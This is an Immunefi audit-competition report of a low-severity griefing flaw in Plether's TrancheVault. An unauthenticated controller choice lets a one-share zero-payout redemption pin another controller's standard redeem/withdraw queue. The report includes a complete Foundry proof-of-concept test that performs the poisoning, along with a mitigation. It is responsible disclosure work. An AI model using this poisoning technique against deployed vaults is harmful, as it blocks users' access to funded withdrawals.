# \#99209 [SC-Low] Unauthenticated choice of redemption controller lets a dust refund pin another controller's standard claim queue.

**Submitted on Nov 12th 2026 at 12:20:52 UTC by @Psyone for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99209
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`requestRedeem` permits a shareholder to choose an unrelated controller without that controller's consent. A one-share, full-balance request can receive zero payout and become refundable, yet remain the controller's first request. A later, fully funded withdrawal for the same controller is then invisible to standard `maxRedeem`/`maxWithdraw` and rejected by standard `redeem`/`withdraw`, because those methods use only the first controller request. A standard-only contract controller cannot clear the attacker-created head or select the later funded request through its exposed methods.

## Vulnerability Details

[`TrancheVault.requestRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631) authorizes spending the `owner`'s shares but does not authenticate the chosen `controller`. The request is inserted into that controller's queue by [`_appendControllerRedeem`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1783-L1797). The minimum-size rule permits a shareholder's entire balance, even when one share quotes zero assets.

When LP settlement quotes zero for that request, [`refundRedeemEpochRemainder`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1505-L1523) marks it refundable and removes its **global** epoch queue node. Its **controller** queue node remains. Only a controller-authorized `claimRedeemRefund` later marks the refund claimed and permits `_maybeCloseRedeemPosition` to unlink it. The attacker is not authorized to perform that action for the victim.

The standard [`redeem`/`withdraw` methods](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L998-L1021) and [`maxRedeem`/`maxWithdraw`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1299-L1311) always read `controllerRedeemHead[controller]`. They do not select a later funded request while a refund-only head remains. Plether's [LP integration guide](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L186-L196) tells integrators to claim funded exits through ERC-4626 `redeem` or `withdraw`. [ERC-7540](https://eips.ethereum.org/EIPS/eip-7540) uses those methods for claimable redemptions and has no standard claim-by-ID or refund method. This is an interoperability and queue-liveness problem; the EIP does not itself mandate a particular ordering across request IDs.

The closest published issue, Cecuro MED-24, concerns zero-payout epochs consuming the **global** bounded settlement budget. This path clears the global queue and instead pins one controller's claim methods after a separate later epoch has already been funded. Plether's Known Limitations document zero-value full-balance requests and controller-only refund acknowledgements, but not attacker-selected controller-head poisoning of a later funded claim.

## Impact Details

The local PoC uses a normal Junior share deposit and separate attacker and victim owners. One attacker-owned share is requested for redemption with the victim's controller address. After its zero-payout refund, the victim controller submits a 100,000,000,000-share redemption in a later epoch. LP settlement transfers **99,999,097 six-decimal USDG atoms (99.999097 USDG)** into withdrawal escrow for that later request. The victim's `claimableRedeemRequest` is 100,000,000,000 shares and `claimableRedeemAssets` is 99,999,097 atoms, yet both standard maxima are zero and the victim's authorized `redeem` reverts. An unpoisoned controller's corresponding standard claim succeeds. The attacker cannot call either custom recovery method for the victim.

The EOA negative control is material: its standard `redeem` also fails, but it immediately claims the entire funded amount with Plether's explicit-ID `claimRedeem` and clears the dust head with `claimRedeemRefund`. The lasting loss of standard-claim liveness applies to controllers that expose the documented standard operations but lack arbitrary calls or Plether-specific recovery hooks. The PoC models such a controller; it does not identify an already-deployed restricted integration or prove a time-based High impact. The current public first-party frontend implements both custom methods, so this PoC does not show its users losing access to funds.

## Mitigation

Decouple refund-only positions from the controller's standard funded-claim head. Keep their refund entitlements addressable by `(controller, requestId)`, but advance a separate bounded funded-claim pointer when an epoch is refunded or funded. Standard `maxRedeem`, `maxWithdraw`, `redeem`, and `withdraw` should select a claimable funded request without requiring a nonstandard refund acknowledgment for an unrelated zero-value request. Avoid an unbounded scan over attacker-created dust positions. Add a regression test with an attacker-supplied foreign controller, a zero-quote refund, a later funded request, and both EOA and standard-only contract controllers.

## References

- [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/)
- [Pinned TrancheVault source](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol)
- [Plether canonical LP entrypoints](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/CANONICAL_ENTRYPOINTS.md#L186-L196)
- [ERC-7540 async vault standard](https://eips.ethereum.org/EIPS/eip-7540)
- [Prior Cecuro audit, MED-24](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)
- [Pinned Known Limitations](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1401-L1414)

## Proof of Concept

## Proof of Concept

At the pinned commit, save this complete test as `packages/perps/test/perps/spec/lp/Finding94Independent.t.sol`, then run from `packages/perps`:

```bash
forge test --match-path test/perps/spec/lp/Finding94Independent.t.sol -vv
```

Expected: two passing tests. The restricted-controller case shows 99,999,097 USDG atoms funded but standard claim blocked; the EOA case shows exact recovery through the explicit-ID claim and refund. The test changes no in-scope production contract and sends no public-network transaction.


```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @dev A controller with the two common ERC-7540/4626 calls but no custom refund or explicit-epoch claim.
contract Finding94RestrictedController {

    TrancheVault internal immutable vault;
    address internal immutable owner;

    constructor(
        TrancheVault vault_,
        address owner_
    ) {
        vault = vault_;
        owner = owner_;
    }

    function requestRedeem(
        uint256 shares
    ) external returns (uint256) {
        require(msg.sender == owner, "not owner");
        return vault.requestRedeem(shares, address(this), address(this));
    }

    function redeem(
        uint256 shares
    ) external returns (uint256) {
        require(msg.sender == owner, "not owner");
        return vault.redeem(shares, address(this), address(this));
    }

}

contract Finding94IndependentTest is BasePerpTest {

    address internal constant FUNDER = address(0xF94A);
    address internal constant ATTACKER = address(0xF94B);
    address internal constant EOA_VICTIM = address(0xF94C);
    address internal constant CONTROL = address(0xF94D);
    uint256 internal constant VICTIM_SHARES = 100_000_000_000;

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000_000;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000_000;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_RestrictedControllerHasFundedButBlockedStandardClaim() public {
        Finding94RestrictedController victim = new Finding94RestrictedController(juniorVault, FUNDER);
        _fundShares();
        vm.prank(FUNDER);
        juniorVault.transfer(address(victim), VICTIM_SHARES);
        vm.prank(FUNDER);
        juniorVault.transfer(CONTROL, VICTIM_SHARES);

        uint256 poisonedEpoch = _poison(address(victim));
        _settleAt(poisonedEpoch);
        assertEq(juniorVault.refundableRedeemRequest(poisonedEpoch, address(victim)), 1);
        assertEq(juniorVault.controllerRedeemHead(address(victim)), poisonedEpoch);
        assertEq(juniorVault.redeemQueueHead(), 0, "global queue must advance");

        vm.prank(FUNDER);
        uint256 fundedEpoch = victim.requestRedeem(VICTIM_SHARES);
        vm.prank(CONTROL);
        assertEq(juniorVault.requestRedeem(VICTIM_SHARES, CONTROL, CONTROL), fundedEpoch);
        assertGt(fundedEpoch, poisonedEpoch);
        _settleAt(fundedEpoch);

        uint256 victimAssets = juniorVault.claimableRedeemAssets(fundedEpoch, address(victim));
        emit log_named_uint("restricted_victim_claimable_USDG_atoms", victimAssets);
        assertEq(juniorVault.claimableRedeemRequest(fundedEpoch, address(victim)), VICTIM_SHARES);
        assertGt(victimAssets, 0, "victim later request must receive real USDG funding");
        assertGe(juniorVault.withdrawalEscrowAssets(), victimAssets);
        assertEq(juniorVault.maxRedeem(address(victim)), 0);
        assertEq(juniorVault.maxWithdraw(address(victim)), 0);

        vm.prank(FUNDER);
        vm.expectPartialRevert(ERC4626.ERC4626ExceededMaxRedeem.selector);
        victim.redeem(VICTIM_SHARES);
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeemRefund(poisonedEpoch, ATTACKER, address(victim));
        vm.prank(ATTACKER);
        vm.expectRevert(TrancheVault.TrancheVault__NotControllerOrOperator.selector);
        juniorVault.claimRedeem(fundedEpoch, VICTIM_SHARES, ATTACKER, address(victim));

        assertEq(juniorVault.claimableRedeemAssets(fundedEpoch, address(victim)), victimAssets);
        assertEq(juniorVault.controllerRedeemHead(address(victim)), poisonedEpoch);
        vm.prank(CONTROL);
        assertGt(juniorVault.redeem(VICTIM_SHARES, CONTROL, CONTROL), 0, "unpoisoned standard claim works");
    }

    function test_EoaControllerCanClaimExplicitFundedEpochBeforeRefund() public {
        _fundShares();
        vm.prank(FUNDER);
        juniorVault.transfer(EOA_VICTIM, VICTIM_SHARES);

        uint256 poisonedEpoch = _poison(EOA_VICTIM);
        _settleAt(poisonedEpoch);
        uint256 fundedEpoch;
        vm.prank(EOA_VICTIM);
        fundedEpoch = juniorVault.requestRedeem(VICTIM_SHARES, EOA_VICTIM, EOA_VICTIM);
        _settleAt(fundedEpoch);

        uint256 claimable = juniorVault.claimableRedeemAssets(fundedEpoch, EOA_VICTIM);
        emit log_named_uint("EOA_claimable_USDG_atoms", claimable);
        assertGt(claimable, 0);
        assertEq(juniorVault.maxRedeem(EOA_VICTIM), 0);
        vm.prank(EOA_VICTIM);
        vm.expectPartialRevert(ERC4626.ERC4626ExceededMaxRedeem.selector);
        juniorVault.redeem(VICTIM_SHARES, EOA_VICTIM, EOA_VICTIM);

        uint256 balanceBefore = settlementToken.balanceOf(EOA_VICTIM);
        vm.prank(EOA_VICTIM);
        uint256 received = juniorVault.claimRedeem(fundedEpoch, VICTIM_SHARES, EOA_VICTIM, EOA_VICTIM);
        emit log_named_uint("EOA_claim_received_USDG_atoms", received);
        assertEq(received, claimable, "explicit epoch claim returns exactly escrowed USDG");
        assertEq(settlementToken.balanceOf(EOA_VICTIM), balanceBefore + claimable);
        assertEq(juniorVault.controllerRedeemHead(EOA_VICTIM), poisonedEpoch);

        vm.prank(EOA_VICTIM);
        assertEq(juniorVault.claimRedeemRefund(poisonedEpoch, EOA_VICTIM, EOA_VICTIM), 1);
        assertEq(juniorVault.controllerRedeemHead(EOA_VICTIM), 0);
    }

    function _fundShares() internal {
        uint256 assets = 999_000_000;
        settlementToken.mint(FUNDER, assets);
        vm.startPrank(FUNDER);
        settlementToken.approve(address(juniorVault), assets);
        uint256 depositEpoch = juniorVault.requestDeposit(assets, FUNDER, FUNDER);
        vm.stopPrank();
        _settleAt(depositEpoch);
        vm.prank(FUNDER);
        uint256 shares = juniorVault.claimDeposit(depositEpoch, assets, FUNDER, FUNDER);
        assertGe(shares, 2 * VICTIM_SHARES + 1, "ordinary deposit provides victim and attacker shares");
        assertEq(juniorVault.estimateRedeemAssets(1), 0, "single share is zero-quote dust");
        _finishCooldown(FUNDER);
    }

    function _poison(
        address controller
    ) internal returns (uint256 epoch) {
        vm.prank(FUNDER);
        juniorVault.transfer(ATTACKER, 1);
        vm.prank(ATTACKER);
        epoch = juniorVault.requestRedeem(1, controller, ATTACKER);
        assertEq(juniorVault.controllerRedeemHead(controller), epoch);
    }

    function _settleAt(
        uint256 epoch
    ) internal {
        uint256 start = pool.lpEpochStart(epoch);
        if (block.timestamp < start) {
            vm.warp(start);
        }
        _settleLpEpochForTest();
    }

    function _finishCooldown(
        address holder
    ) internal {
        uint256 unlockAt = juniorVault.lastDepositTime(holder) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlockAt) {
            vm.warp(unlockAt);
        }
    }

}
```
